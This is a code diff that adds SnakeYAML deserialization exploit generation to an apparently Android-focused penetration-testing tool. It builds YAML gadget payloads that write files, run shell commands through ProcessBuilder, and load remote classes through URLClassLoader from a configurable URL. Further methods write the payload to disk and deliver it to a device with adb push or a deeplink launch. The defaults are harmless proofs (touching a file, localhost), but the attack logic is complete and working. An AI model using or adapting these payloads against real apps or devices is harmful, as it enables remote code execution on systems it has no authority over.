@@ -50,6 +50,23 @@ class OtherTools:
             "path": Constants.DIR_LOOT_PATH.value
         }
 
+        self.snake_data = {
+            "type": "write_to_sd",
+            "path": Constants.DIR_LOOT_PATH.value,
+            "filename": "snake_poc.yml",
+            "mal_url": "http://localhost:8080",
+            "cmd": 'touch /sdcard/command-executed.txt && echo \'RCE successful\' > /sdcard/command-executed.txt',
+            "app_name": "com.example.android",
+            "exec_mode": "push_to_sd",
+            "component": "com.example.android.MainActivity"
+        }
+
+        self._snakeyml_payload = {
+            "write_to_sd": 'some_var: !!java.io.FileOutputStream ["/sdcard/yaml-rce-proof.txt"]',
+            "exec_cmd": f'some_var: !!java.lang.ProcessBuilder ["/system/bin/sh", "-c", "{self.snake_data.get("cmd")}"]',
+            "oob": f'some_var: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["{self.snake_data.get("mal_url")}"]]]]'
+        }
+
         self._deeplink = ""
         self.backup_files = {}
         self._init_backup_constants()
@@ -212,3 +229,30 @@ class OtherTools:
             f.writelines(poc)
             print(Fore.GREEN + f'[+] Content written to file {os.path.join(self._generate_deeplink_data["path"], "exploit.html")}' + Fore.RESET)
     
+    def generate_snakeyml_payload(self):
+        full_path = os.path.join(self.snake_data["path"], self.snake_data["filename"])
+        self._update_snakeyaml()
+        with open(full_path, 'w') as f:
+            f.write(self._snakeyml_payload[self.snake_data["type"]])
+            print(Fore.GREEN + f'[+] Content written to file {full_path}' + Fore.RESET)
+
+
+    def _update_snakeyaml(self):
+        self._snakeyml_payload = {
+            "write_to_sd": 'some_var: !!java.io.FileOutputStream ["/sdcard/yaml-rce-proof.txt"]',
+            "exec_cmd": f'some_var: !!java.lang.ProcessBuilder [["/system/bin/sh", "-c", "{self.snake_data.get("cmd")}"]]',
+            "oob": f'some_var: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["{self.snake_data.get("mal_url")}"]]]]'
+        }
+
+    def execute_snakeyml_payload(self):
+        full_path = os.path.join(self.snake_data["path"], self.snake_data["filename"])
+        self._update_snakeyaml()
+        attack_mode = self.snake_data.get("exec_mode").lower()
+        if attack_mode == "push_to_sd":
+            cmd = f"adb push {full_path} /sdcard"
+            p = subprocess.run(cmd.split(), stderr=PIPE, stdout=PIPE)
+            print(Fore.GREEN + f'[+] Content pushed to /sdcard/{self.snake_data["filename"]}' + Fore.RESET)
+        elif attack_mode == "launch_deeplink":
+            cmd = f'adb shell am start -a android.intent.action.VIEW -n {self.snake_data["app_name"]}/{self.snake_data["component"]} -d {self.snake_data["mal_url"]}'
+            p = subprocess.run(cmd.split(), stderr=PIPE, stdout=PIPE)
+            print(Fore.GREEN + f'[+] Executing {cmd}' + Fore.RESET)
